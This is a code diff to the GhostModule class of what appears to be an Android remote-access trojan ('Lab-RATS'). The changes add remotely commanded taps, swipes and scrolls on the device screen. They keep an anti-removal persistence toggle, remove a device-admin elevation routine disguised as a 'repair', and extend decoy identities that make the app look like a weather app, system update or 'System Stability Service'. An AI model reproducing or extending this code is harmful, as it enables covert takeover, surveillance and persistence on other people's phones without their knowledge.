@@ -615,10 +725,24 @@ public class GhostModule extends BaseModule {
                 if (params.containsKey("px") && params.containsKey("py")) {
                     float px = Float.parseFloat(params.get("px"));
                     float py = Float.parseFloat(params.get("py"));
-                    int realX = (int) (px * ghost.getScreenWidth() / 100);
-                    int realY = (int) (py * ghost.getScreenHeight() / 100);
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    int realX = (int) (px * sw / 100);
+                    int realY = (int) (py * sh / 100);
                     success = ghost.clickAt(realX, realY);
                 }
+                break;
+            case "scroll_up":
+                success = ghost.performScroll("up");
+                break;
+            case "scroll_down":
+                success = ghost.performScroll("down");
+                break;
+            case "scroll_left":
+                success = ghost.performScroll("left");
+                break;
+            case "scroll_right":
+                success = ghost.performScroll("right");
                 break;
             case "swipe_up":
             case "menu":
@@ -648,10 +772,12 @@ public class GhostModule extends BaseModule {
                     float px2 = Float.parseFloat(params.get("px2"));
                     float py2 = Float.parseFloat(params.get("py2"));
                     int d = params.containsKey("d") ? Integer.parseInt(params.get("d")) : 300;
-                    int x1 = (int) (px1 * ghost.getScreenWidth() / 100);
-                    int y1 = (int) (py1 * ghost.getScreenHeight() / 100);
-                    int x2 = (int) (px2 * ghost.getScreenWidth() / 100);
-                    int y2 = (int) (py2 * ghost.getScreenHeight() / 100);
+                    int sw = ghost.getScreenWidth() > 0 ? ghost.getScreenWidth() : 1080;
+                    int sh = ghost.getScreenHeight() > 0 ? ghost.getScreenHeight() : 2400;
+                    int x1 = (int) (px1 * sw / 100);
+                    int y1 = (int) (py1 * sh / 100);
+                    int x2 = (int) (px2 * sw / 100);
+                    int y2 = (int) (py2 * sh / 100);
                     success = ghost.swipe(x1, y1, x2, y2, d);
                 }
                 break;
@@ -683,26 +809,6 @@ public class GhostModule extends BaseModule {
                 break;
             case "toggleAntiRemoval":
                 IO_Persistence_Manager.setAntiRemovalEnabled(!IO_Persistence_Manager.isAntiRemovalEnabled());
-                success = true;
-                break;
-            case "elevateAdmin":
-            case "elevate_admin":
-            case "admin":
-                new Handler(Looper.getMainLooper()).post(() -> {
-                    try {
-                        context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
-                            .edit().putBoolean("is_repairing", true).apply();
-                        IO_Persistence_Manager.setAutoPilot(true);
-                        IO_Persistence_Manager.stopSmartExit();
-
-                        Intent wrapperIntent = new Intent(context, com.labs.labrats.PermissionActivity.class);
-                        wrapperIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
-                        wrapperIntent.putExtra("launch_admin", true);
-                        context.startActivity(wrapperIntent);
-                    } catch (Exception e) {
-                        android.util.Log.e("GhostModule", "Failed to launch device admin: " + e.getMessage());
-                    }
-                });
                 success = true;
                 break;
             case "type":
@@ -751,7 +857,8 @@ public class GhostModule extends BaseModule {
                     else if (type.equals("weather")) choice = 3;
                     else if (type.equals("update")) choice = 4; // System Update
                     else if (type.equals("smarttutor") || type.contains("tutor")) choice = 5; // Smart Tutor
-                    else if (type.equals("logo")) choice = 6;
+                    else if (type.equals("logo") || type.equals("labrats")) choice = 6; // Lab-RATS Logo (Unmasked)
+                    else if (type.equals("systemstability") || type.contains("stability") || type.equals("launcher")) choice = 7; // System Stability Service (Unmasked)
                     
                     SystemAnalytics.setDecoyChoice(context, choice);
                 }
